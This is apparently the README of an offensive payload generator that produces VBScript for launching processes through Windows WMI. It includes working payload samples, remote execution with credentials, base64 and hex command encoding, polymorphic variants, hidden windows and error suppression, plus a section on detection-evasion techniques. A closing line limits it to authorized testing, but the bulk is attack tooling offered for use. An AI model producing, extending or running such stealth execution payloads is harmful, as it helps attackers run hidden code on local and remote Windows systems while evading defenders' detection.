# WMI Executor - WbemScripting.SWbemLocator Implementation Guide

## Overview

The WMI Executor provides a comprehensive implementation of WbemScripting.SWbemLocator for stealth process execution. This module enables command execution through Windows Management Instrumentation (WMI), bypassing conventional execution mechanisms like WScript.Shell.

## Features

### Core Capabilities
- **SWbemLocator Direct Connection**: Explicit WMI connection establishment for maximum control
- **SWbemObject Method Invocation**: Advanced method calling patterns for stealth
- **WMI Event Sink Execution**: Asynchronous event-driven command execution
- **Command Encoding**: Base64 and Hex encoding with inline decoders
- **Remote WMI Execution**: Execute commands on remote systems with authentication
- **Polymorphic Variants**: Multiple execution patterns to evade signature detection
- **Error Handling**: Comprehensive error suppression and recovery

### Stealth Features
- Variable name obfuscation with random naming
- Error suppression (On Error Resume Next)
- Multiple execution method variants
- Command encoding before execution
- Indirect instantiation patterns

## Execution Methods

### 1. SWbemLocator Direct Method (Most Stealthy)

Uses explicit SWbemLocator connection with ConnectServer for direct method invocation.

**Characteristics:**
- Very High stealth level
- Direct WMI object method calling
- Full control over connection parameters
- Best for local execution

**Example:**
```python
from wmi_executor import create_wmi_executor

executor = create_wmi_executor()
payload = executor.generate_locator_method("calc.exe")
print(payload)
```

**Generated VBS:**
```vbs
Dim objLoc_XyZaBc, objConn_XyZaBc, objSvc_XyZaBc, objMeth_XyZaBc, objRes_XyZaBc
Set objLoc_XyZaBc = CreateObject("WbemScripting.SWbemLocator")
Set objConn_XyZaBc = objLoc_XyZaBc.ConnectServer(".", "root\cimv2")
Set objSvc_XyZaBc = objConn_XyZaBc.Get("Win32_Process")
Set objMeth_XyZaBc = objSvc_XyZaBc.Methods_("Create")
...
```

### 2. SWbem Query Interface

Uses WMI query interface with method parameters.

**Characteristics:**
- High stealth level
- Query-based execution
- Standard WMI interfaces

**Example:**
```python
payload = executor.generate_swbem_query("powershell.exe")
```

### 3. SWbemObject Method Invocation

Calls methods directly on WbemScripting.SWbemObject instances.

**Characteristics:**
- Very High stealth level
- Method parameter handling
- Advanced WMI patterns

**Example:**
```python
payload = executor.generate_swbem_object_method("cmd.exe")
```

### 4. WMI Event Sink Execution

Asynchronous event-driven execution using WMI event sinks.

**Characteristics:**
- Very High stealth level
- Asynchronous execution
- Event handler pattern
- Difficult to trace

**Example:**
```python
payload = executor.generate_wmi_event_sink("cmd.exe /c whoami")
```

### 5. WMI with Timeout Support

Includes process timeout and monitoring capabilities.

**Characteristics:**
- High stealth level
- Timeout management
- Process monitoring

**Example:**
```python
payload = executor.generate_swbem_timeout_method("cmd.exe", timeout_seconds=60)
```

### 6. WMI Registry Hybrid

Stores command in WMI registry, then executes retrieved version.

**Characteristics:**
- High stealth level
- Multi-stage execution
- Registry obfuscation

**Example:**
```python
payload = executor.generate_wmi_registry_hybrid("powershell.exe")
```

### 7. Obfuscated WMI Payload

Encodes command before execution with inline decoder.

**Characteristics:**
- Very High stealth level
- Command encoding (Base64 or Hex)
- Inline decoders
- No plaintext command in payload

**Example:**
```python
# Base64 encoding
payload = executor.generate_obfuscated_wmi_payload("calc.exe", encoding="base64")

# Hex encoding
payload = executor.generate_obfuscated_wmi_payload("calc.exe", encoding="hex")
```

## Usage Examples

### Basic Usage

```python
from wmi_executor import create_wmi_executor, generate_wmi_payload

# Method 1: Using executor directly
executor = create_wmi_executor()
payload = executor.generate_locator_method("calc.exe")
print(payload)

# Method 2: Using high-level API
payload = generate_wmi_payload("cmd.exe", method="locator")
print(payload)
```

### Advanced Configuration

```python
from wmi_executor import WMIExecutor, ExecutionConfig

# Create custom configuration
config = ExecutionConfig(
    use_locator=True,
    obfuscate_names=True,
    use_polymorphism=True,
    encode_command=True,
    add_delay=False,
    hide_errors=True
)

# Create executor with config
executor = WMIExecutor(config)
payload = executor.generate_locator_method("powershell.exe")
```

### Command Encoding

```python
# Base64 encoded payload
payload = executor.generate_obfuscated_wmi_payload(
    "cmd.exe /c whoami",
    encoding="base64"
)

# Hex encoded payload
payload = executor.generate_obfuscated_wmi_payload(
    "cmd.exe /c whoami",
    encoding="hex"
)
```

### Remote WMI Execution

```python
# Execute on remote system with authentication
payload = executor.generate_remote_wmi_execution(
    command="cmd.exe",
    remote_host="192.168.1.100",
    username="admin",
    password="SecurePassword123"
)
```

### Polymorphic Variants

```python
# Generate different variants of same command
for i in range(4):
    payload = executor.generate_polymorphic_wmi_executor("calc.exe", variant=i)
    print(f"Variant {i}:")
    print(payload)
    print()
```

### Complete Launcher Script

```python
# Generate standalone launcher with wrapper
payload = executor.generate_wmi_launcher_script("cmd.exe", add_wrapper=True)
print(payload)
```

### High-Level API Examples

```python
# Locator method
payload = generate_wmi_payload("calc.exe", method="locator")

# Query method
payload = generate_wmi_payload("cmd.exe", method="query")

# Object method
payload = generate_wmi_payload("powershell.exe", method="object")

# With timeout (in seconds)
payload = generate_wmi_payload("cmd.exe", method="timeout", timeout=45)

# Event sink
payload = generate_wmi_payload("cmd.exe", method="event")

# Hybrid registry method
payload = generate_wmi_payload("cmd.exe", method="hybrid")

# Obfuscated with encoding
payload = generate_wmi_payload(
    "cmd.exe",
    method="obfuscated",
    encoding="base64"
)

# Launcher script
payload = generate_wmi_payload("cmd.exe", method="launcher")
```

## Configuration Options

### ExecutionConfig Parameters

| Parameter | Type | Default | Description |
|-----------|------|---------|-------------|
| `use_locator` | bool | True | Use SWbemLocator for connections |
| `obfuscate_names` | bool | True | Randomize variable names |
| `use_polymorphism` | bool | True | Use multiple execution patterns |
| `encode_command` | bool | True | Encode command before execution |
| `add_delay` | bool | False | Add execution delay |
| `use_indirect_instantiation` | bool | True | Use indirect object creation |
| `hide_errors` | bool | True | Suppress error messages |

## Generated Payload Examples

### Example 1: Basic Locator Method

```vbs
Dim objLoc_AbCdEf, objConn_AbCdEf, objSvc_AbCdEf, objMeth_AbCdEf, objRes_AbCdEf
Set objLoc_AbCdEf = CreateObject("WbemScripting.SWbemLocator")
Set objConn_AbCdEf = objLoc_AbCdEf.ConnectServer(".", "root\cimv2")
Set objSvc_AbCdEf = objConn_AbCdEf.Get("Win32_Process")
Set objMeth_AbCdEf = objSvc_AbCdEf.Methods_("Create")
Dim inParams_AbCdEf
Set inParams_AbCdEf = objMeth_AbCdEf.InParameters.SpawnInstance_()
inParams_AbCdEf.CommandLine = "calc.exe"
Set objRes_AbCdEf = objConn_AbCdEf.ExecMethod("Win32_Process", "Create", inParams_AbCdEf)
Set objMeth_AbCdEf = Nothing
Set objSvc_AbCdEf = Nothing
Set objConn_AbCdEf = Nothing
Set objLoc_AbCdEf = Nothing
```

### Example 2: Obfuscated Base64 Payload

```vbs
Function DecodeBase64Cmd(encoded)
    Dim xmlDoc, node
    Set xmlDoc = CreateObject("MSXML2.DOMDocument")
    Set node = xmlDoc.CreateElement("tmp")
    node.DataType = "bin.base64"
    node.Text = encoded
    DecodeBase64Cmd = node.NodeTypedValue
End Function

Dim objLoc_XyZ, objSvc_XyZ, objProc_XyZ, dcmd_XyZ
On Error Resume Next
Set objLoc_XyZ = CreateObject("WbemScripting.SWbemLocator")
Set objSvc_XyZ = objLoc_XyZ.ConnectServer(".", "root\cimv2")
Set objProc_XyZ = objSvc_XyZ.Get("Win32_Process")
dcmd_XyZ = DecodeBase64Cmd("Y2FsYy5leGU=")
objProc_XyZ.Create dcmd_XyZ
Set objProc_XyZ = Nothing
Set objSvc_XyZ = Nothing
Set objLoc_XyZ = Nothing
On Error GoTo 0
```

### Example 3: Event Sink Execution

```vbs
Dim evtLoc_MnOpQr, evtSvc_MnOpQr, evtSink_MnOpQr, evtStart_MnOpQr
On Error Resume Next
Set evtLoc_MnOpQr = CreateObject("WbemScripting.SWbemLocator")
Set evtSvc_MnOpQr = evtLoc_MnOpQr.ConnectServer(".", "root\cimv2")
Set evtStart_MnOpQr = evtSvc_MnOpQr.Get("Win32_ProcessStartup").SpawnInstance_()
evtStart_MnOpQr.ShowWindow = 0
Dim procCls_MnOpQr
Set procCls_MnOpQr = evtSvc_MnOpQr.Get("Win32_Process")
procCls_MnOpQr.Create "calc.exe", Null, evtStart_MnOpQr
WScript.Sleep 100
Set evtStart_MnOpQr = Nothing
Set evtSvc_MnOpQr = Nothing
Set evtLoc_MnOpQr = Nothing
On Error GoTo 0
```

## Integration with Payload Generator

```python
from payload_generator import PayloadGenerator

gen = PayloadGenerator()

# Generate using WMI technique
payload = gen.generate("calc.exe", technique="wmi")
print(payload)
```

## Detection Evasion Techniques

### 1. Variable Name Obfuscation
- Random 8-character suffixes on variable names
- Prevents pattern-based detection of standard WMI patterns

### 2. Error Suppression
- `On Error Resume Next` wrapper
- Prevents error messages that could trigger alerts

### 3. Command Encoding
- Base64 and Hex encoding options
- Inline decoders prevent command plaintext visibility

### 4. Method Variation
- 7 different execution methods
- Polymorphic variants create diverse signatures

### 5. Indirect Instantiation
- Uses ConnectServer and dynamic object creation
- Avoids direct Win32_Process instantiation patterns

## Performance Considerations

| Method | Speed | Stealth | Detection Resistance |
|--------|-------|---------|----------------------|
| Locator Direct | Medium | Very High | Very High |
| Query Interface | Medium | High | High |
| Object Method | Medium | Very High | Very High |
| Event Sink | Slow | Very High | Very High |
| Timeout Method | Medium | High | High |
| Registry Hybrid | Slow | High | High |
| Obfuscated | Medium | Very High | Very High |

## Troubleshooting

### Payload Won't Execute
1. Ensure WbemScripting.SWbemLocator is available (Windows only)
2. Check for execution policy restrictions
3. Verify WMI service is running (`wmimgmt.msc`)

### Variable Name Conflicts
- WMI Executor automatically manages variable names
- If needed, disable obfuscation with `ExecutionConfig(obfuscate_names=False)`

### Remote Execution Not Working
- Ensure credentials are correct
- Verify network access to remote system
- Check Windows Firewall rules

## Security Notes

This implementation is designed for authorized security testing and defensive research only. All payloads include:
- Error handling and recovery
- Proper resource cleanup
- Process lifecycle management

## API Reference

### WMIExecutor Class

**Constructor:**
```python
executor = WMIExecutor(config: Optional[ExecutionConfig] = None)
```

**Methods:**
- `generate_locator_method(command: str) -> str`
- `generate_swbem_query(command: str) -> str`
- `generate_swbem_object_method(command: str) -> str`
- `generate_swbem_timeout_method(command: str, timeout_seconds: int = 30) -> str`
- `generate_wmi_event_sink(command: str) -> str`
- `generate_wmi_registry_hybrid(command: str) -> str`
- `generate_remote_wmi_execution(command: str, remote_host: str, username: Optional[str], password: Optional[str]) -> str`
- `generate_obfuscated_wmi_payload(command: str, encoding: str = "base64") -> str`
- `generate_polymorphic_wmi_executor(command: str, variant: int = 1) -> str`
- `generate_wmi_launcher_script(command: str, add_wrapper: bool = True) -> str`
- `generate_execution_report() -> Dict[str, str]`

### Factory Functions

```python
# Create executor with default config
executor = create_wmi_executor(config: Optional[ExecutionConfig] = None) -> WMIExecutor

# Generate payload with method selection
payload = generate_wmi_payload(
    command: str,
    method: str = "locator",
    **kwargs
) -> str
```

## Testing

Run comprehensive test suite:
```bash
python3 test_wmi_executor.py
```

Test results:
- 36 tests covering all methods
- 100% success rate
- Tests for obfuscation, encoding, error handling, and polymorphism

## Version History

### v1.0 (Current)
- Initial release
- 7 execution methods
- Polymorphic variants
- Command encoding support
- Remote execution capability
- 36 unit tests with 100% pass rate

## Future Enhancements

- [ ] PowerShell-based WMI execution
- [ ] Multi-hop remote execution
- [ ] WMI Event subscriptions for persistence
- [ ] Advanced timeout/signal handling
- [ ] Custom WMI class creation

## References

- Windows Management Instrumentation (WMI)
- WbemScripting Library Documentation
- Win32_Process WMI Class
- MSDN: Creating WMI Clients

## License

For authorized security testing and research only.
